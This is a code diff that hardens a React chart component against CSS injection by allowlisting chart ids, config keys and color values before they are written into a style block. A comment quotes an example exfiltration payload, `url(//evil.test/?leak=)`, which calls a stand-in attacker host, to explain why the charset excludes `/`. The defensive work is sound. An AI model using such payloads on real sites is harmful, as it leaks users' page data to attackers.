@@ -22,6 +22,42 @@ type ChartContextProps = {
 
 const ChartContext = React.createContext<ChartContextProps | null>(null);
 
+// ChartStyle writes these into a <style> block, so a value carrying `;`, `}` or
+// `</style>` would escape its declaration. Config keys are not always literals —
+// the tag aggregation panel builds them from user-supplied eval tag names.
+const CSS_IDENT = /^[A-Za-z0-9_-]+$/;
+// `/` and `*` are excluded and MUST STAY excluded. Without `/` the charset
+// still admits `url(//evil.test/?leak=)`: a protocol-relative URL needs no `:`
+// and no `;`, so it clears every other guard here and the declaration it lands
+// in is a perfectly well-formed one. Excluding `*` likewise keeps `/*` out of
+// reach. Together they are what makes this an allowlist rather than a
+// punctuation filter.
+//
+// The cost is that space-separated alpha — `rgb(0 0 0 / 50%)`,
+// `hsl(220 10% 50% / .4)` — does not pass. That is a deliberate trade, not an
+// oversight: no color in this repo uses it (they are `var(--chart-N)`,
+// `color-mix(...)`, `hsl(var(...))` and hex literals), and admitting `/` to
+// support it would reopen the exfiltration channel above. A color needing
+// alpha should go through `color-mix(in oklch, ... , transparent)`, which the
+// charset already admits and which the eval charts already use.
+const CSS_COLOR = /^[A-Za-z0-9_\-#%.,()\s]+$/;
+
+// Dropping a key or a color is silent to the page — the declaration simply is
+// not emitted, and the chart falls back to whatever it styles marks with
+// directly. That is correct for the injection case and confusing for a
+// legitimate value that happens to miss the charset, so say so in development.
+// Never in production: the dropped value can be attacker-chosen, and a console
+// is not the place to echo it back.
+function warnDroppedChartValue(what: string, value: string): void {
+  if (process.env.NODE_ENV === "production") return;
+  console.warn(
+    `[ChartStyle] dropped ${what} ${JSON.stringify(value)}: it is not a plain ` +
+      `CSS identifier / color. It was NOT written into the <style> block. If ` +
+      `this is a legitimate value, see CSS_IDENT / CSS_COLOR in chart.tsx — ` +
+      `note that \`/\` is excluded on purpose.`,
+  );
+}
+
 function useChart() {
   const context = React.useContext(ChartContext);
 
@@ -68,9 +104,22 @@ function ChartContainer({
 }
 
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
-  const colorConfig = Object.entries(config).filter(
-    ([, config]) => config.theme || config.color,
-  );
+  // The id lands unquoted in `[data-chart=...]`, so it has to clear the same
+  // charset as the keys. Checked here rather than in ChartContainer: this
+  // component is exported, and the caller is not the sink.
+  if (!CSS_IDENT.test(id)) {
+    warnDroppedChartValue("chart id", id);
+    return null;
+  }
+
+  const colorConfig = Object.entries(config).filter(([key, config]) => {
+    if (!(config.theme || config.color)) return false;
+    if (!CSS_IDENT.test(key)) {
+      warnDroppedChartValue("config key", key);
+      return false;
+    }
+    return true;
+  });
 
   if (!colorConfig.length) {
     return null;
@@ -88,7 +137,12 @@ ${colorConfig
     const color =
       itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ||
       itemConfig.color;
-    return color ? `  --color-${key}: ${color};` : null;
+    if (!color) return null;
+    if (!CSS_COLOR.test(color)) {
+      warnDroppedChartValue("color", color);
+      return null;
+    }
+    return `  --color-${key}: ${color};`;
   })
   .join("\n")}
 }
